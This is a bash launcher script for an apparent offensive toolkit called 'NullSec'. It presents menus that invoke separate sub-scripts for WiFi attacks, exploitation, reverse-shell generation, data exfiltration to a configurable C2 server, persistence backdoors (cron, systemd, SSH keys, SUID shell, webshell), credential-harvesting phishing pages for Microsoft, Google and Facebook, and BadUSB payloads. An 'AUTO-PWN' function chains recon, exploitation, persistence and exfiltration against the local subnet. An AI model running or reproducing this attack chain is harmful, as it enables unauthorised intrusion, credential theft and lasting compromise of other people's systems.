#!/bin/bash
#===============================================================================
#
#  ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗ ██████╗
#  ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝██╔════╝
#  ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗  ██║     
#  ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝  ██║     
#  ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗╚██████╗
#  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝
#                                                              
#  NULLSEC PAYLOAD LAUNCHER v1.0
#  Advanced Offensive Security Toolkit
#
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_DIR="$SCRIPT_DIR"
LOOT_DIR="/root/loot/nullsec"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
export C2_SERVER="${C2_SERVER:-192.168.1.100}"
export C2_PORT="${C2_PORT:-4444}"
export EXFIL_SERVER="${EXFIL_SERVER:-$C2_SERVER}"
export EXFIL_PORT="${EXFIL_PORT:-8443}"

mkdir -p "$LOOT_DIR"

banner() {
    clear
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║  ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗ ██████╗      ║
    ║  ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝██╔════╝      ║
    ║  ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗  ██║           ║
    ║  ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝  ██║           ║
    ║  ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗╚██████╗      ║
    ║  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝      ║
    ║                                                                   ║
    ║              PAYLOAD LAUNCHER - Offensive Toolkit                 ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${CYAN}    C2 Server: $C2_SERVER:$C2_PORT | Exfil: $EXFIL_SERVER:$EXFIL_PORT${NC}"
    echo ""
}

show_menu() {
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  PAYLOAD MODULES${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${CYAN}[1]${NC}  WiFi Attacks      - Deauth, Evil Twin, WPA Cracking"
    echo -e "  ${CYAN}[2]${NC}  Reconnaissance    - Network Discovery, Service Enum"
    echo -e "  ${CYAN}[3]${NC}  Exploitation      - Auto-Exploit, Shell Generation"
    echo -e "  ${CYAN}[4]${NC}  Exfiltration      - Data Collection & Transfer"
    echo -e "  ${CYAN}[5]${NC}  Persistence       - Backdoors & Implants"
    echo -e "  ${CYAN}[6]${NC}  Phishing          - Credential Harvesting Pages"
    echo -e "  ${CYAN}[7]${NC}  BadUSB            - Rubber Ducky Payloads"
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  QUICK ACTIONS${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${CYAN}[A]${NC}  AUTO-PWN          - Full automated attack chain"
    echo -e "  ${CYAN}[L]${NC}  Start Listener   - NetCat reverse shell listener"
    echo -e "  ${CYAN}[R]${NC}  Start Receiver   - Exfil data receiver"
    echo -e "  ${CYAN}[V]${NC}  View Loot        - Browse captured data"
    echo -e "  ${CYAN}[C]${NC}  Configure        - Set C2/Exfil servers"
    echo ""
    echo -e "  ${CYAN}[0]${NC}  Exit"
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════${NC}"
}

wifi_menu() {
    echo -e "\n${YELLOW}WiFi Attack Options:${NC}"
    echo "  1) Scan Networks"
    echo "  2) Deauth Attack"
    echo "  3) Capture Handshake"
    echo "  4) PMKID Attack"
    echo "  5) Evil Twin"
    echo "  6) Crack Handshake"
    echo "  7) AUTO-PWN (Full Chain)"
    echo "  0) Back"
    
    read -p "Select: " opt
    case $opt in
        1) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" scan ;;
        2) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" deauth ;;
        3) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" capture ;;
        4) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" pmkid ;;
        5) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" evil ;;
        6) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" crack ;;
        7) bash "$PAYLOAD_DIR/wifi/nullsec-wifi-pwner.sh" autopwn ;;
    esac
}

recon_menu() {
    echo -e "\n${YELLOW}Reconnaissance Options:${NC}"
    echo "  1) Discover Hosts"
    echo "  2) Enumerate Services"
    echo "  3) Vulnerability Scan"
    echo "  4) OSINT Gathering"
    echo "  5) Full Auto Recon"
    echo "  6) Generate Report"
    echo "  0) Back"
    
    read -p "Select: " opt
    read -p "Target (IP/Range/Domain): " target
    case $opt in
        1) bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" discover "$target" ;;
        2) bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" enum "$target" ;;
        3) bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" vuln "$target" ;;
        4) bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" osint "$target" ;;
        5) bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" auto "$target" ;;
        6) bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" report ;;
    esac
}

exploit_menu() {
    echo -e "\n${YELLOW}Exploitation Options:${NC}"
    echo "  1) SMB Exploits"
    echo "  2) SSH Brute Force"
    echo "  3) HTTP Vuln Scan"
    echo "  4) Generate Shell"
    echo "  5) Privesc Check"
    echo "  6) Auto Exploit"
    echo "  0) Back"
    
    read -p "Select: " opt
    case $opt in
        1) read -p "Target: " t; bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" smb "$t" ;;
        2) read -p "Target: " t; bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" ssh "$t" ;;
        3) read -p "Target: " t; bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" http "$t" ;;
        4) 
            echo "Shell types: bash, python, perl, php, ruby, nc, powershell, msfvenom"
            read -p "Type: " type
            bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" shell "$type" "$C2_SERVER" "$C2_PORT"
            ;;
        5) bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" privesc ;;
        6) read -p "Target: " t; bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" auto "$t" ;;
    esac
}

exfil_menu() {
    echo -e "\n${YELLOW}Exfiltration Options:${NC}"
    echo "  1) Collect Loot"
    echo "  2) HTTP Exfil"
    echo "  3) DNS Exfil"
    echo "  4) ICMP Exfil"
    echo "  5) USB Exfil"
    echo "  6) Auto Exfil"
    echo "  7) Start Receiver"
    echo "  0) Back"
    
    read -p "Select: " opt
    case $opt in
        1) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" collect ;;
        2) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" http ;;
        3) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" dns ;;
        4) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" icmp ;;
        5) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" usb ;;
        6) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" auto ;;
        7) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" receiver ;;
    esac
}

persist_menu() {
    echo -e "\n${YELLOW}Persistence Options:${NC}"
    echo "  1) Cron Job"
    echo "  2) Systemd Service"
    echo "  3) SSH Key"
    echo "  4) Bashrc Hook"
    echo "  5) SUID Shell"
    echo "  6) Webshell"
    echo "  7) Start Beacon"
    echo "  8) Install ALL"
    echo "  9) Check Status"
    echo "  0) Back"
    
    read -p "Select: " opt
    case $opt in
        1) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" cron ;;
        2) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" systemd ;;
        3) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" ssh ;;
        4) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" bashrc ;;
        5) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" suid ;;
        6) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" webshell ;;
        7) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" beacon ;;
        8) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" all ;;
        9) bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" status ;;
    esac
}

phishing_menu() {
    echo -e "\n${YELLOW}Phishing Options:${NC}"
    echo "  1) Generate Microsoft 365"
    echo "  2) Generate Google"
    echo "  3) Generate Facebook"
    echo "  4) Generate Corporate"
    echo "  5) Generate All Pages"
    echo "  6) Start Server"
    echo "  7) View Credentials"
    echo "  0) Back"
    
    read -p "Select: " opt
    case $opt in
        1) bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" microsoft ;;
        2) bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" google ;;
        3) bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" facebook ;;
        4) read -p "Company name: " name; bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" corporate "$name" ;;
        5) bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" all ;;
        6) bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" start ;;
        7) bash "$PAYLOAD_DIR/phishing/nullsec-phishing.sh" creds ;;
    esac
}

badusb_menu() {
    echo -e "\n${YELLOW}BadUSB Payloads:${NC}"
    echo "  Windows payloads: $PAYLOAD_DIR/badusb/nullsec-ducky-windows.txt"
    echo "  Linux payloads:   $PAYLOAD_DIR/badusb/nullsec-ducky-linux.sh"
    echo ""
    echo "  1) View Windows Payloads"
    echo "  2) View Linux Payloads"
    echo "  3) Encode for Ducky (DuckEncoder)"
    echo "  0) Back"
    
    read -p "Select: " opt
    case $opt in
        1) less "$PAYLOAD_DIR/badusb/nullsec-ducky-windows.txt" ;;
        2) less "$PAYLOAD_DIR/badusb/nullsec-ducky-linux.sh" ;;
        3) 
            if command -v ducky-encode &>/dev/null || command -v duckencode &>/dev/null; then
                read -p "Input file: " input
                read -p "Output file: " output
                java -jar /opt/duckencoder/duckencode.jar -i "$input" -o "$output" 2>/dev/null || \
                    echo "DuckEncoder not found. Download from Hak5."
            else
                echo "DuckEncoder not installed."
            fi
            ;;
    esac
}

auto_pwn() {
    echo -e "\n${RED}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}                    AUTO-PWN SEQUENCE                               ${NC}"
    echo -e "${RED}═══════════════════════════════════════════════════════════════════${NC}"
    
    read -p "Target (IP/Range): " target
    [[ -z "$target" ]] && target=$(ip route | grep default | awk '{print $3}' | sed 's/\.[0-9]*$/.0\/24/')
    
    echo -e "\n${YELLOW}[1/5] Reconnaissance...${NC}"
    bash "$PAYLOAD_DIR/recon/nullsec-recon.sh" auto "$target"
    
    echo -e "\n${YELLOW}[2/5] Auto-Exploitation...${NC}"
    # Get discovered hosts
    local hosts=$(grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' /root/loot/nullsec-recon/hosts/*.txt 2>/dev/null | sort -u)
    for host in $hosts; do
        bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" auto "$host"
    done
    
    echo -e "\n${YELLOW}[3/5] Collecting Loot...${NC}"
    bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" collect
    
    echo -e "\n${YELLOW}[4/5] Installing Persistence...${NC}"
    bash "$PAYLOAD_DIR/persist/nullsec-persist.sh" all 2>/dev/null
    
    echo -e "\n${YELLOW}[5/5] Exfiltrating Data...${NC}"
    bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" auto
    
    echo -e "\n${GREEN}AUTO-PWN COMPLETE!${NC}"
    echo "Check loot in: $LOOT_DIR"
}

configure() {
    echo -e "\n${YELLOW}Configuration:${NC}"
    echo "Current C2 Server: $C2_SERVER:$C2_PORT"
    echo "Current Exfil Server: $EXFIL_SERVER:$EXFIL_PORT"
    echo ""
    read -p "New C2 Server IP [$C2_SERVER]: " new_c2
    read -p "New C2 Port [$C2_PORT]: " new_port
    read -p "New Exfil Server [$EXFIL_SERVER]: " new_exfil
    read -p "New Exfil Port [$EXFIL_PORT]: " new_eport
    
    [[ -n "$new_c2" ]] && export C2_SERVER="$new_c2"
    [[ -n "$new_port" ]] && export C2_PORT="$new_port"
    [[ -n "$new_exfil" ]] && export EXFIL_SERVER="$new_exfil"
    [[ -n "$new_eport" ]] && export EXFIL_PORT="$new_eport"
    
    echo -e "\n${GREEN}Configuration updated!${NC}"
}

view_loot() {
    echo -e "\n${YELLOW}Loot Directory: $LOOT_DIR${NC}"
    echo ""
    
    # Summary
    echo "=== Loot Summary ==="
    find "$LOOT_DIR" -type f 2>/dev/null | wc -l | xargs echo "Total files:"
    du -sh "$LOOT_DIR" 2>/dev/null | awk '{print "Total size:", $1}'
    echo ""
    
    # List categories
    ls -la "$LOOT_DIR" 2>/dev/null
    
    echo ""
    read -p "Open directory in file manager? (y/n): " yn
    [[ "$yn" == "y" ]] && xdg-open "$LOOT_DIR" 2>/dev/null
}

# Main loop
main() {
    while true; do
        banner
        show_menu
        
        read -p "Select option: " choice
        
        case $choice in
            1) wifi_menu ;;
            2) recon_menu ;;
            3) exploit_menu ;;
            4) exfil_menu ;;
            5) persist_menu ;;
            6) phishing_menu ;;
            7) badusb_menu ;;
            [Aa]) auto_pwn ;;
            [Ll]) bash "$PAYLOAD_DIR/exploit/nullsec-exploit.sh" listen ;;
            [Rr]) bash "$PAYLOAD_DIR/exfil/nullsec-exfil.sh" receiver ;;
            [Vv]) view_loot ;;
            [Cc]) configure ;;
            0|[Qq]) echo -e "\n${GREEN}Stay dangerous! - NullSec${NC}\n"; exit 0 ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

# Run
main "$@"
